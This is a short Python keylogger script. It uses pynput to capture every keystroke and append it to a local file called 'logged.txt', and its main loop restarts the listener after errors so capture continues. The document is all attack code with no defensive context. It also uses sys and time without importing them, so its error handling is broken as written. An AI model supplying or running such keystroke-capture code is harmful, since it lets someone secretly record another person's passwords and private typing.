from pynput import keyboard

def writeToFile(key):
	if key == None:
		return

	with open("logged.txt", "a") as file:
		file.write(" " + key)

def on_press(key):
	output = None
	try:
		output = format(key.char)
	except AttributeError:
		output = format(key)
		
	writeToFile(output)

def main():
	with keyboard.Listener(on_press = on_press) as listener:
		listener.join()

if __name__ == "__main__":
	while True:
		try:
			main()
		except KeyboardInterrupt:
			sys.exit(0)
		except Exception as e:
			time.sleep(2)